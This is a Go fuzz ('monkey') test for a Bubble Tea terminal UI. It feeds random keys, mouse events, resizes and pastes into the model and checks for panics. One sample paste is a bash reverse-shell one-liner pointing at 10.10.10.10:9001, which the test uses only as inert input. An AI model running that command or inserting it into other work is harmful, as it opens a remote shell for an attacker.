package ui

import (
	"fmt"
	"math/rand/v2"
	"os"
	"reflect"
	"runtime/debug"
	"strconv"
	"strings"
	"testing"
	"time"

	tea "charm.land/bubbletea/v2"
)

// drainFast runs what Update returned, skipping commands that wait
// (notification timers): a monkey does not wait.
func drainFast(m *Model, cmd tea.Cmd, depth int) {
	if cmd == nil || depth > 30 {
		return
	}
	done := make(chan tea.Msg, 1)
	go func() { done <- cmd() }()
	var msg tea.Msg
	select {
	case msg = <-done:
	case <-time.After(30 * time.Millisecond):
		return
	}
	switch msg := msg.(type) {
	case tea.BatchMsg:
		for _, c := range msg {
			drainFast(m, c, depth+1)
		}
	case nil:
	default:
		if v := reflect.ValueOf(msg); v.Kind() == reflect.Slice && v.Type().Elem() == reflect.TypeFor[tea.Cmd]() {
			for i := range v.Len() {
				drainFast(m, v.Index(i).Interface().(tea.Cmd), depth+1)
			}
			return
		}
		_, next := m.Update(msg)
		drainFast(m, next, depth+1)
	}
}

var monkeyKeys = []tea.KeyPressMsg{
	{Code: tea.KeyEnter}, {Code: tea.KeyEscape}, {Code: tea.KeyBackspace}, {Code: tea.KeyTab},
	{Code: tea.KeyTab, Mod: tea.ModShift},
	{Code: tea.KeyUp}, {Code: tea.KeyDown}, {Code: tea.KeyLeft}, {Code: tea.KeyRight},
	{Code: tea.KeyDelete}, {Code: tea.KeyHome}, {Code: tea.KeyEnd}, {Code: tea.KeyPgDown}, {Code: tea.KeyPgUp},
	{Code: 'c', Mod: tea.ModCtrl}, {Code: 'p', Mod: tea.ModCtrl}, {Code: 'o', Mod: tea.ModCtrl},
	{Code: 'h', Mod: tea.ModCtrl}, {Code: 'j', Mod: tea.ModCtrl}, {Code: 'k', Mod: tea.ModCtrl}, {Code: 'l', Mod: tea.ModCtrl},
	{Code: '1', Mod: tea.ModAlt}, {Code: '2', Mod: tea.ModAlt}, {Code: '3', Mod: tea.ModAlt},
	{Code: 'z', Mod: tea.ModAlt},
	{Code: 'c'}, {Code: 'o'}, {Code: 'e'}, {Code: 'y'}, {Code: 'q', Mod: tea.ModCtrl},
}

const monkeyText = "abcdefghijklmnopqrstuvwxyzABGHJLNOPVY0123456789$^{}()[]\"'/?|:.,~ éー"

func monkeyMsg(r *rand.Rand, m *Model) tea.Msg {
	switch n := r.IntN(100); {
	case n < 55:
		c := []rune(monkeyText)[r.IntN(len([]rune(monkeyText)))]
		return tea.KeyPressMsg{Code: c, Text: string(c)}
	case n < 85:
		return monkeyKeys[r.IntN(len(monkeyKeys))]
	case n < 90:
		pastes := []string{
			"bash -i >& /dev/tcp/10.10.10.10/9001 0>&1",
			"some\ttext\r\nwith lines\n\x01",
			strings.Repeat("long ", 200),
		}
		return tea.PasteMsg{Content: pastes[r.IntN(len(pastes))]}
	case n < 96:
		x, y := r.IntN(max(m.w, 1)), r.IntN(max(m.h, 1))
		if r.IntN(2) == 0 {
			return tea.MouseClickMsg{X: x, Y: y, Button: tea.MouseLeft}
		}
		return tea.MouseWheelMsg{X: x, Y: y, Button: []tea.MouseButton{tea.MouseWheelUp, tea.MouseWheelDown}[r.IntN(2)]}
	default:
		return tea.WindowSizeMsg{Width: 40 + r.IntN(220), Height: 10 + r.IntN(60)}
	}
}

func TestMonkey(t *testing.T) {
	// MONKEY=n runs n seeds instead of a handful.
	seeds, steps := 6, 800
	if n, err := strconv.Atoi(os.Getenv("MONKEY")); err == nil {
		seeds, steps = n, 1500
	}
	if testing.Short() {
		seeds, steps = 2, 300
	}
	for seed := range seeds {
		m := newModel(t)
		r := rand.New(rand.NewPCG(uint64(seed), 7))
		var trail []string
		for step := range steps {
			msg := monkeyMsg(r, m)
			trail = append(trail, fmt.Sprintf("%T%+v", msg, msg))
			func() {
				defer func() {
					if p := recover(); p != nil {
						last := trail[max(len(trail)-15, 0):]
						t.Fatalf("seed %d step %d: panic %v\n%s\nlast messages:\n%s", seed, step, p, debug.Stack(), strings.Join(last, "\n"))
					}
				}()
				_, cmd := m.Update(msg)
				drainFast(m, cmd, 0)
				checkScreen(t, m, m.w, m.h, fmt.Sprintf("seed %d step %d after %T", seed, step, msg))
			}()
		}
	}
}
